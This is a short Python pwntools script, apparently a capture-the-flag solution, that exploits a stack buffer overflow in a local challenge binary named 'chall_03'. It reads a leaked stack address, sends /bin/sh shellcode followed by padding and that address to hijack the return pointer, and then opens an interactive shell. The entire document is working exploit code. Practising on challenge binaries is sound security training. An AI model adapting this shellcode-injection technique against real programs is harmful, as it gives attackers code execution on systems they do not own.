from pwn import *
context.arch="amd64"
elf=ELF("./chall_03")
shellcode = asm(shellcraft.sh())
len(shellcode)
p=process("./chall_03")
p.recvuntil("\n")
leak = p.recv()
stackleak = int(leak[-15:],16)
payload = shellcode+b's'*280+p64(stackleak)
p.sendline(payload)
p.interactive()
